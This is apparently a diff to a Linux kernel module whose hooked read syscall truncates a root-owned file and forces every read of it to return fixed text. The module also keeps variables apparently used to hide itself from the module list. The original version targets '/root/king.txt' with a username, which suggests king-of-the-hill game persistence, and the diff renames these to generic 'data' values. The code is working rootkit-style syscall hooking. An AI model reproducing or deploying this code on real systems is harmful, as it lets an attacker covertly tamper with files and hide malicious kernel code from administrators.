@@ -15,9 +15,9 @@ MODULE_AUTHOR("Trevohack");
 MODULE_DESCRIPTION("LKM Library");
 MODULE_VERSION("0.02");
 
-#define TARGET_FILE "/root/king.txt"
-#define USERNAME "Trevohack\n"
-#define USERNAME_LEN (strlen(USERNAME))
+#define TARGET_FILE "/root/data.txt"
+#define DATA "data\n"
+#define DATA_LEN (strlen(DATA))
 
 static struct list_head *prev_module;
 static short hidden = 0;
@@ -119,25 +119,25 @@ asmlinkage ssize_t hook_read(struct pt_regs *regs){
         loff_t pos;
         ssize_t ret;
 
-        // make the file size equal to USERNAME_LEN
+        // make the file size equal to DATA_LEN
         // even if the file had nothing or less that
-        // username len the len will always be equal 
-        // to USERNAME_LEN
-        vfs_truncate(&file->f_path, USERNAME_LEN);
+        // DATA len the len will always be equal 
+        // to DATA_LEN
+        vfs_truncate(&file->f_path, DATA_LEN);
 
         pos = file->f_pos;
 
         // this is cause no more bytes can be read
         // and we use this to indicate EOF (end of file)
-        if (pos ==  USERNAME_LEN){
+        if (pos ==  DATA_LEN){
            ret = 0; 
            goto done;
         } 
 
-        if (count > USERNAME_LEN) count = USERNAME_LEN;
+        if (count > DATA_LEN) count = DATA_LEN;
         count = count  - pos;
         
-        if (copy_to_user(buf, USERNAME, USERNAME_LEN)){
+        if (copy_to_user(buf, DATA, DATA_LEN)){
             ret = -EFAULT;
             goto done;
         }
